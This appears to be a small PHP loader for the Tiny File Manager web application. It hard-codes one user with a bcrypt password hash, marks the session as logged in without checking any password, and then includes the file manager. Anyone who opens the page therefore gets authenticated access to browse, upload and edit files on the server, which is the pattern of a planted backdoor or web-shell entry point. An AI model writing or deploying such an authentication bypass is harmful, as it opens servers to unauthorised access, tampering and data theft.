<?php 
session_start();
$auth_users = array(
    'fatih' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO'
);
$key=array_keys($auth_users)[0];
if ( !defined('FM_SESSION_ID')) {
    define('FM_SESSION_ID', $key);
}
$_SESSION[FM_SESSION_ID]['logged'] = FM_SESSION_ID;
require 'tinyfilemanager.php';